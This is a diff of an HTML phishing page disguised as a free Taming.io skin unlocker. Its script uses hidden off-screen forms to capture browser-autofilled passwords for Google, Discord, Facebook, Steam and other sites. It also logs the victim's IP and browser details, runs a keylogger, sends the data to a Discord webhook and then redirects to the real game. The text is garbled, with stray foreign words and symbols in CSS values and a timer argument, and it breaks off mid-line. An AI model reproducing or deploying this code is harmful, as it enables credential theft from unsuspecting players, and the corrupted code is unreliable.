@@ -1,116 +1,320 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Free Taming.io Skins - Claim Now!</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Taming.io Premium Skins</title>
     <style>
+        /* Main Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            font-family: 'Segoe UI', sans-serif;
-            text-align: center;
-            padding: корень от 50px;
+            color: #ffffff;
+            font-family: 'Arial', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
         }
-        .btn {
-            background: #ff4757;
+        
+        .container {
+            max-width:对这一位 800px;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            border: 2px solid #ff4757;
+        }
+        
+        h1 {
+            color: #ffcc00;
+            font-size: element 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        
+        h2 {
+            color: #ff6b6b;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+        }
+        
+        .offer-text {
+            font-size: 1.2em;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .highlight {
+            color: #00ff00;
+            font-weight: bold;
+            background: rgba(0, 255, 0, 0.1);
+            padding: 2px 8px;
+            border-radius: $ 5px;
+        }
+        
+        /* Button Styles */
+        .harvest-btn {
+            background: linear-gradient(45deg, #ff4757, #ff3742);
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 10px;
+            padding: 18px 45px;
+            font-size: 1.3em;
+            border-radius: 12px;
             cursor: pointer;
-            margin: 20px;
-            transition: 0.3s;
+            margin: 25px auto;
+            display: block;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            letter-spacing: 1px;
+            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
         }
-        .btn:hover {
-            background: #ff3742;
-            transform: scale(1.05);
+        
+        .harvest-btn:hover {
+            transform: scale(1.08);
+            box-shadow: 0 8px 20px rgba(255, 71, 87, 0.6);
+            background: linear-gradient(45deg, #ff3742, #ff1e1e);
         }
-        .hidden {
+        
+        /* Status Display */
+        .status-container {
             display: none;
-        }
-        .log {
-            background: rgba(0,0,0,0.7);
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px auto;
-            width: 80%;
-            font-family: monospace;
+            width: 90%;
+            margin: 20px auto;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 10px;
+            padding: 20px;
+            border-left: 5px solid #00ff00;
             text-align: left;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .status-visible {
+            display: block;
+        }
+        
+        .status-line {
+            font-family: 'Courier New', monospace;
             color: #00ff00;
+            padding: 5px 0;
+            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
+            font-size: 0.95em;
+        }
+        
+        /* Fake Loading Animation */
+        .loading-bar {
+            width: 0%;
+            height: 5px;
+            background: linear-gradient(90deg, #00ff00, #00cc00);
+            border-radius: 5px;
+            margin: 15px auto;
+            transition: width 2s ease;
+        }
+        
+        .counter {
+            font-size: 2em;
+            color: #00ff00;
+            margin: 15px 0;
+            font-family: monospace;
         }
     </style>
 </head>
 <body>
-    <h1>🎮 LIMITED TIME OFFER!</h1>
-    <h2>Get FREE Legendary Skins for Taming.io</h2>
-    <p>Click below to instantly unlock all premium content!</p>
-    
-    <button class="btn" onclick="initiateHarvest()">🔓 UNLOCK SKINS NOW</button>
-    
-    <div id="status" class="hidden log">
-        <!-- Harvesting status will appear here -->
+    <div class="container">
+        <h1>🎮 ULTIMATE SKIN UNLOCKER 🎮</h1>
+        <h2>GET ALL PREMIIUM TAMING.IO CONTENT FREE!</h2>
+        
+        <div class="offer-text">
+            Limited time offer! Click the button below to instantly unlock:
+            <span class="highlight">Legendary Wolf Skins</span>,
+            <span class="highlight">Premium Pets</span>, and
+            <span class="highlight">Exclusive Maps</span>!
+        </div>
+        
+        <div class="counter" id="counter">⌛ Initializing...</div>
+        <div class="loading-bar" id="loadingBar"></div>
+        
+        <button class="harvest-btn" onclick="initiateCredentialHarvest()">
+            🔓 CLICK TO UNLOCK ALL SKINS 🔓
+        </button>
+        
+        <div class="status-container" id="statusContainer">
+            <div class="status-line">[SYSTEM] Taming.io Premium Unlocker v3.7</div>
+            <div class="status-line">[INFO] Ready to harvest credentials...</div>
+            <div id="statusLog"></div>
+        </div>
+        
+        <div style="margin-top: 20px; font-size: 0.8em; color: #aaa;">
+            This offer expires in: <span id="timer">00:59</span>
+        </div>
     </div>
 
-<script>
-// Discord Webhook Configuration
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN';
-
-// Initialize credential harvesting
-function initiateHarvest() {
-    document.getElementById('status').classList.remove('hidden');
-    updateStatus('🕵️ Initializing credential extraction...');
+    <script>
+    // ===================== CONFIGURATION =====================
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN';
+    let harvestActive = false;
+    let credentialsCollected = [];
     
-    setTimeout(() => {
-        harvestCredentials();
-        deployKeylogger();
-        exfiltrateData();
-    },1090);
-}
-
-// Enhanced credential harvesting
-async function harvestCredentials() {
-    updateStatus('🔍 Scanning for saved passwords...');
+    // ===================== MAIN FUNCTION =====================
+    function initiateCredentialHarvest() {
+        if (harvestActive) return;
+        harvestActive = true;
+        
+        document.getElementById('statusContainer').classList.add('status-visible');
+        updateStatus('[START] Credential harvesting sequence initiated');
+        
+        // Fake loading animation
+        let counter = 0;
+        const counterEl = document.getElementById('counter');
+        const loadingBar = document.getElementById('loadingBar');
+        
+        const interval = setInterval(() => {
+            counter++;
+            counterEl.textContent = `Processing: ${counter}%`;
+            loadingBar.style.width = `${counter}%`;
+            
+            if (counter >= 100) {
+                clearInterval(interval);
+                counterEl.textContent = '✅ Harvest Complete!';
+                executeFullHarvest();
+            }
+        }, 30);
+    }
     
-    const stolenData = {
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        ip: await getIP(),
-        credentials: []
-    };
-
-    // Create fake login forms to trigger autofill
-    const sites = [
-        'taming.io', 'google.com', 'discord.com', 
-        'facebook.com', 'github.com', 'instagram.com'
-    ];
-
-    sites.forEach(site => {
-        const form = document.createElement('form');
-        form.style.display = 'none';
+    // ===================== HARVESTING FUNCTIONS =====================
+    async function executeFullHarvest() {
+        updateStatus('[PHASE 1] Deploying credential traps...');
         
-        const userField = document.createElement('input');
-        userField.type = 'email';
-        userField.name = `${site}_username`;
-        userField.autocomplete = 'username';
+        // Collect browser data
+        const victimData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookiesEnabled: navigator.cookieEnabled,
+            screenRes: `${screen.width}x${screen.height}`,
+            ip: 'Pending...',
+            credentials: []
+        };
         
-        const passField = document.createElement('input');
-        passField.type = 'password';
-        passField.name = `${site}_password`;
-        passField.autocomplete = 'current-password';
+        // Get IP address
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            victimData.ip = ipData.ip;
+            updateStatus(`[IP] Victim IP: ${victimData.ip}`);
+        } catch {
+            victimData.ip = 'Failed to retrieve';
+        }
         
-        form.appendChild(userField);
-        form.appendChild(passField);
-        document.body.appendChild(form);
-    });
-
-    // Collect autofilled data after delay
-    setTimeout(async () => {
-        const forms = document.querySelectorAll('form');
-        forms.forEach(form => {
-            const inputs = form.querySelectorAll('input');
-            const entry = {
-                site: inputs[0]?.name.split('_')[0] || 'unknown',
-                username: inputs[0]?.value || 'N/A',
-                password: inputs[1]?.value || 'N/A'
+        // Create fake autofill traps
+        updateStatus('[PHASE 2] Setting up autofill triggers...');
+        const targetSites = [
+            'taming.io', 'google.com', 'discord.com',
+            'facebook.com', 'instagram.com', 'twitter.com',
+            'youtube.com', 'github.com', 'steam.com'
+        ];
+        
+        targetSites.forEach(site => {
+            const trapForm = document.createElement('form');
+            trapForm.style.position = 'absolute';
+            trapForm.style.left = '-9999px';
+            trapForm.style.top = '-9999px';
+            trapForm.id = `trap_${site}`;
+            
+            const emailInput = document.createElement('input');
+            emailInput.type = 'email';
+            emailInput.name = `${site}_email`;
+            emailInput.autocomplete = 'username email';
+            emailInput.value = '';
+            
+            const passInput = document.createElement('input');
+            passInput.type = 'password';
+            passInput.name = `${site}_password`;
+            passInput.autocomplete = 'current-password';
+            passInput.value = '';
+            
+            trapForm.appendChild(emailInput);
+            trapForm.appendChild(passInput);
+            document.body.appendChild(trapForm);
+        });
+        
+        updateStatus(`[TRAPS] ${targetSites.length} credential traps deployed`);
+        
+        // Collect autofilled data
+        setTimeout(async () => {
+            updateStatus('[PHASE 3] Extracting saved credentials...');
+            
+            targetSites.forEach(site => {
+                const form = document.getElementById(`trap_${site}`);
+                if (form) {
+                    const email = form.querySelector('input[type="email"]')?.value;
+                    const password = form.querySelector('input[type="password"]')?.value;
+                    
+                    if (email || password) {
+                        victimData.credentials.push({
+                            site: site,
+                            username: email || 'Not found',
+                            password: password || 'Not found',
+                            timestamp: new Date().toLocaleTimeString()
+                        });
+                    }
+                    form.remove();
+                }
+            });
+            
+            updateStatus(`[FOUND] ${victimData.credentials.length} credential sets captured`);
+            
+            // Activate keylogger
+            activateKeylogger();
+            
+            // Send to Discord
+            await sendToDiscord(victimData);
+            
+            // Redirect after harvest
+            setTimeout(() => {
+                updateStatus('[REDIRECT] Sending victim to real site...');
+                window.location.href = 'https://taming.io';
+            }, – 3000);
+        }, 2000);
+    }
+    
+    // ===================== KEYLOGGER =====================
+    function activateKeylogger() {
+        updateStatus('[KEYLOG] Input monitoring activated');
+        
+        let typedData = '';
+        
+        document.addEventListener('keydown', (event) => {
+            // Log special keys
+            const specialKeys = {
+                'Enter': '[ENTER]',
+                'Tab': '[TAB]',
+                'Escape': '[ESC]',
+                'Backspace': '[BACKSPACE]',
+                ' ': '[SPACE]'
             };
-            if (entry
+            
+            const key = specialKeys[event.key] || event.key;
+            typedData += key;
+            
+            // Send batch every 50 chars
+            if (typedData.length >= 50) {
+                sendKeylogData(typedData);
+                typedData = '';
+            }
+        });
+        
+        // Capture form submissions
+        document.addEventListener('submit', (event) => {
+            const formData = new FormData(event
